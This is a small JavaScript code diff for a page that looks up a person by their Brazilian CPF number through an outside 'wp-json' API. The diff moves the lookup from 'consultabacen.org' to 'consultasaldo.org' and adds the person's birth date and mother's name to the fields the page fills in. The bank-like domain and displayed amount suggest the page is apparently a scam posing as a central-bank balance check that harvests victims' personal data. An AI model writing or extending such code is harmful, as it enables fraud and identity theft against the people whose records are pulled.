@@ -239,7 +239,7 @@ document.getElementById('totalValor').textContent = valorFmt;
 
 // Busca API se não veio valor
 if(cpf && !params.get('valor')){
-  fetch('https://consultabacen.org/wp-json/cpf/v1/consultar?cpf=' + cpf)
+  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf=' + cpf)
     .then(function(r){ return r.json(); })
     .then(function(d){
       if(d.nome && !nome){
@@ -253,6 +253,8 @@ if(cpf && !params.get('valor')){
         document.getElementById('totalValor').textContent = v;
         valor = d.valor;
       }
+      if(d.nascimento && !nasc){ nasc = d.nascimento; }
+      if(d.nome_mae && !mae){ mae = d.nome_mae; }
     }).catch(function(){});
 }
 
